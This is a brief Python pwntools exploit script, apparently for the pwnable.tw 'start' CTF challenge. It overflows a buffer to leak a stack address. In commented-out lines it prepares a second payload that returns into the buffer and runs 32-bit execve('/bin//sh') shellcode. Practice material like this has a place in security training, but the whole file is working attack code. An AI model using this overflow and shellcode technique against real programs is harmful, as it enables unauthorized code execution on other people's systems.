from pwn import *
context.log_level = 'debug'
e = ELF("./start")
p = process("./start")
#p = remote("chall.pwnable.tw", 10000)
writefn = p32(0x8048087)
payload0 = ""
payload0 = b"\x90"*20
payload0 += writefn

recv = p.recvuntil(":")
print (recv)

p.send(payload0)

bufaddr = u32(p.recv(4))

print ("buffer address =", hex(bufaddr))

#shell = b"A"*20
#shell += p32(bufaddr+20)
#shell += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
